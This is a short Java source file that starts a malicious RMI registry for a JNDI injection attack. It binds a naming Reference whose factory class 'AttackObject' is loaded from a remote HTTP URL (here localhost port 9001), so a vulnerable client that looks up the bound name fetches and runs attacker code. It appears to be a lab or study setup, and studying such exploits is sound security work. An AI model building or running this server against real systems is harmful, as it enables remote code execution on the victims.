package com.adun;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Zhu Dunfeng
 * @date 2021/12/13 11:25
 */
public class RegistryServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
//        String className=AttackObject.class.getName();
        Reference reference = new Reference("AttackObject", "AttackObject","http://127.0.0.1:9001/AttackObject.class" );
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj", referenceWrapper);
        System.out.println("RegistryServer is running.......");
    }
}
